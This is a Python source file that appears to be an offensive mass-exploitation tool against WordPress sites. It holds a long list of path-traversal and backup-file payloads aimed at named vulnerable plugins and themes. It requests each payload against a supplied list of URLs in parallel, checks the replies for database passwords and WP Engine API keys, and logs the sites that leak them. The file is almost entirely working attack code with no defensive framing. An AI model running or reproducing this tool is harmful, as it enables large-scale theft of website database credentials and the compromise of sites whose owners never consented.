import requests
import re
import multiprocessing as mp

afd_list = """/wp-config.php~
/wp-config.php.backup
/wp-config.php.bck
/wp-config.php.save
/wp-config.php.sav
/wp-config.php.copy
/wp-config.php.orig
/wp-config.php.tmp
/wp-config.php.txt
/wp-config.php.back
/wp-config.php.zip
/wp-config.php.test
/wp-config.php.tgz
/wp-config.php.temp
/wp-config.php.tar.gz
/wp-config.php.bakup
/wp-config.php.war
/wp-config.php.tar
/wp-config.php.saved
/wp-config.php.sav
/wp-config.php.pas
/wp-config.php.orig
/wp-config.php.ini
/wp-config.php.jar
/wp-config.php.default
/wp-config.php.db
/wp-config.php.dat
/wp-config.php.core
/wp-config.php.conf
/_wpeprivate/config.json
/wp-config.php.bak
/wp-config.php.old
/wp-config.php.backup
/?action=cpis_init&cpis-action=f-download&purchase_id=1&cpis_user_email=i0SECLAB@intermal.com&f=wp-config.php
/?mdocs-img-preview=wp-config.php
/mdocs-posts/?mdocs-img-preview=../../wp-config.php
/wp-admin/admin-ajax.php?action=kbslider_show_image&img=../../wp-config.php
/wp-admin/admin-ajax.php?action=revslider_show_image&img=../../wp-config.php
/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&dir=/&item=../../wp-config.php&order=name&srt=yes
/wp-admin/edit.php?post_type=wd_ads_ads&export=export_csv&path=../../wp-config.php
/wp-admin/tools.php?content=&wp-attachment-export-download=true
/wp-content/force-download.php?file=../../wp-config.php
/wp-content/plugins/./simple-image-manipulator/controller/download.php?filepath=../../../../../../wp-config.php
/wp-content/plugins/asgallDownload.php?imgname=../../../wp-config.php
/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../../wp-config.php
/wp-content/plugins/allow-l10n-upload-filename/download.php?id=../../../../wp-config.php_
/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../../wp-config.php
/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../../wp-config.php
/wp-content/plugins/aspose-importer-exporter/aspose_import_export_download?file=../../../../wp-config.php
/wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../../wp-config.php
/wp-content/plugins/count-per-day/download.php?n=1&f=../../../../wp-config.php
/wp-content/plugins/document_manager/views/file_download.php?fname=../../../../../wp-config.php_
/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../../wp-config.php&file_size=10
/wp-content/plugins/history-collection/download.php?var=../../../../wp-config.php
/wp-content/plugins/hwm_board/download.php?filename=../../../../wp-config.php
/wp-content/plugins/image-export/download.php?file=../../../../wp-config.php
/wp-content/plugins/justified-image-grid/download.php?file=../../../../wp-config.php
/wp-content/plugins/mdc-youtube-downloader/includes/download.php?file=download.php?file=../../../../../wp-config.php
/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=../../../../wp-config.php
/wp-content/plugins/recent-backups/download-file.php?file_link=../../../../wp-config.php
/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?path=../../../../../../../../wp-config.php
/wp-content/plugins/sermon-shortcodes/download.php?file=../../../../wp-config.php
/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=../../../../wp-config.php
/wp-content/plugins/Wordpress/Aaspose-pdf-exporter/aspose_pdf_exporter_download.php?file=../../../../../wp-config.php
/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../../wp-config.php
/wp-content/plugins/wp-filemanager/incl/libfile.php?&path=../../../../../wp-config.php&filename=../../../../../wp-config.php&action=download
/wp-content/plugins/wp-mon/assets/download.php?type=octet/stream&path=../../../../../wp-config.php&name=../../../../../wp-config.php
/wp-content/plugins/wp-swimteam/include/user/download.php?file=../../../../../../wp-config.php&filename=../../../../../../wp-config.php&contenttype=text/html&transient=1&abspath=/usr/share/wordpress
/wp-content/plugins/wptf-image-gallery/lib-mbox/ajax_load.php?url=../../../../../wp-config.php
/wp-content/themes/acento/includes/view-pdf.php?download=1&file=../../../../../wp-config.php
/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../../wp-config.php
/wp-content/themes/authentic/includes/download.php?file=../../../../../wp-config.php
/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../../wp-config.php
/wp-content/themes/epic/includes/download.php?file=../../../../../wp-config.php
/wp-content/themes/erinvale/download.php?file=../../../../wp-config.php
/wp-content/themes/felis/download.php?file=../../../../wp-config.php
/wp-content/themes/fiestaresidences/download.php?file=../../../../wp-config.php
/wp-content/themes/hsv/download.php?file=../../../../wp-config.php
/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php
/wp-content/themes/lote27/download.php?download=../../../../wp-config.php
/wp-content/themes/markant/download.php?file=../../../../wp-config.php
/wp-content/themes/MichaelCanthony/download.php?file=../../../../wp-config.php
/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../../wp-config.php
/wp-content/themes/NativeChurch/download/download.php?file=../../../../../wp-config.php
/wp-content/themes/optimus/download.php?file=../../../../wp-config.php
/wp-content/themes/SMWF/inc/download.php?file=../../../../../wp-config.php
/wp-content/themes/TheLoft/download.php?file=../../../../wp-config.php
/wp-content/themes/trinity/lib/scripts/download.php?file=../../../../../../wp-config.php
/wp-content/themes/urbancity/lib/scripts/download.php?file=../../../../../../wp-config.php
/wp-content/themes/yakimabait/download.php?file=../../../../wp-config.php""".splitlines()


class Exploit:

    def __init__(self, url: str, session: requests.Session):
        self.url = url
        self.session = session

    def parseConfig(self, config: str):
        pass

    def exploit(self):
        for path in afd_list:
            url = self.url + path
            try:
                resp = self.session.get(url, timeout=10, allow_redirects=False)
                if re.search(r'DB_HOST|DB_PASSWORD|table_prefix|wpengine_apikey|WPENGINE_ACCOUNT', resp.text):
                    print(url + " -> OK")
                    self.saveToFile("config.txt", url)
                    break
                else:
                    if path == afd_list[-1]:
                        print(self.url + " -> BAD")
            except Exception:
                if path == afd_list[-1]:
                    print(self.url + " -> ERROR")

    @staticmethod
    def runExploit(url: str):
        if "://" not in url:
            url = "http://" + url
        session = requests.Session()
        session.headers.update(
            {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0'})
        exploit = Exploit(url, session)
        exploit.exploit()

    @staticmethod
    def saveToFile(filename: str, data: str):
        with open(filename, 'a') as f:
            f.write(data + '\n')


def main():
    list_url = open(input("Url ? "), "r").read().splitlines()
    thred = mp.cpu_count() * 5
    pool = mp.Pool(thred)
    pool.map_async(Exploit.runExploit, list_url)
    pool.close()
    pool.join()


if __name__ == '__main__':
    main()
